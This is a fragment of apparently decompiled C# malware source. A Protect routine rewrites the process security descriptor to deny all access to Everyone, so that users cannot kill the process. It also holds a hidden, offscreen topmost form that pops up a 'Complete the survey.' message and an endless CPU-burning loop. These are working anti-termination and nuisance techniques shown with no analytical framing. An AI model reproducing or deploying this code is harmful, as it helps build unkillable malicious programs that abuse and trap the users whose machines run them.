		catch
		{
		}
	}

	private static void ShowMessage()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0073: Unknown result type (might be due to invalid IL or missing references)
		Form val = new Form();
		val.set_Size(new Size(1, 1));
		val.set_StartPosition((FormStartPosition)0);
		Rectangle virtualScreen = SystemInformation.get_VirtualScreen();
		val.set_Location(new Point(virtualScreen.Bottom + 10, virtualScreen.Right + 10));
		((Control)val).Show();
		((Control)val).Focus();
		((Control)val).BringToFront();
		val.set_TopMost(true);
		val.set_ShowIcon(false);
		val.set_ShowInTaskbar(false);
		MessageBox.Show((IWin32Window)(object)val, "Complete the survey.", "", (MessageBoxButtons)0);
		((Component)(object)val).Dispose();
	}

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr handle, int securityInformation, [In] byte[] pSecurityDescriptor);

	private static void Protect()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor processSecurityDescriptor = GetProcessSecurityDescriptor(currentProcess);
			processSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			byte[] array = new byte[processSecurityDescriptor.BinaryLength];
			processSecurityDescriptor.GetBinaryForm(array, 0);
			SetKernelObjectSecurity(currentProcess, 4, array);
		}
		catch
		{
		}
	}

	private static void Calus()
	{
		int num = 0;
		while (true)
		{
			if (num == 50)
			{
				num = 0;
			}
			num++;
		}
	}

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr handle, int securityInformation, [Out] byte[] pSecurityDescriptor, uint nLength, out uint lpnLengthNeeded);

	private static RawSecurityDescriptor GetProcessSecurityDescriptor(IntPtr processHandle)
	{
		try
		{
			byte[] pSecurityDescriptor = new byte[0];
			GetKernelObjectSecurity(processHandle, 4, pSecurityDescriptor, 0u, out var lpnLengthNeeded);
			if ((long)lpnLengthNeeded > 32767L)
			{
				return null;
			}
			if (!GetKernelObjectSecurity(processHandle, 4, pSecurityDescriptor = new byte[lpnLengthNeeded], lpnLengthNeeded, out lpnLengthNeeded))
			{
				return null;
			}
			return new RawSecurityDescriptor(pSecurityDescriptor, 0);
		}
		catch
		{
			return null;
		}
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();
}
